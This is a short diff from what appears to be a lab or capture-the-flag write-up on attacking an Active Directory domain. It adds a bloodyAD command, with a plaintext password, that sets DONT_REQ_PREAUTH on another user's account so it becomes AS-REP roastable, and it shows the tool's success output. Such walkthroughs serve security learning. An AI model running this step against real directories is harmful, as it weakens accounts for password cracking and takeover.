@@ -490,5 +490,12 @@ userAccountControl: WRITE
 This user has write access on this user, this means i should be able to make this user AS-REP roastable
 
 ```python
+bloodyAD --host dc01.fragments.local -d fragments.local -u j.woods -p 'hpFqULtQoY!' add uac 'o.rodrigo' -f DONT_REQ_PREAUTH 
+[+] ['DONT_REQ_PREAUTH'] property flags added to o.rodrigo's userAccountControl
+```
+
+First ill make the account AS-REP roastable
+
+```python
 
 ```
